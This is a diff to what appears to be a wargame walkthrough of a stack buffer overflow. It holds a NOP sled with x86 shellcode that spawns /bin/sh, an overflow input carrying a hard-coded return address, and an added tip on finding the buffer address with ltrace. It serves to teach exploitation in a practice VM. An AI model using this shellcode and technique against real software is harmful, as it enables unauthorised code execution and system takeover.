@@ -139,9 +139,17 @@ the exploit:
 
 ```shell
 python -c 'print "\x90" * 1000 + "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x6a\x0b\x58\xcd\x80"'
-python -c 'print "a" * 14 + "\xbf\xff\xee\x60"[::-1] * 1 + "a" * 1'
+python -c 'print "a" * 14 + "\xbf\xff\xee\x60"[::-1] + "a"'
 cat
 ```
+
+> If the exploit above does not work, it is because of the buffer address in the
+> second input. The memory layout does work in mysterious ways. It is affected
+> by a lot of factors like the arguments the program is given, the environment,
+> and even, apparently, the machine the VM is running on. To fix this, simply
+> call use the [ltrace](https://linux.die.net/man/1/ltrace) command to get the
+> right address. This would be the address of the destination buffer for the
+> first `strncpy` call minus 4100 or so. This should land us inside the buffer.
 
 The shellcode is at the end of the first input. It will be stored inside _p_'s
 read buffer. We put a lot of noops operation before it because we do not know
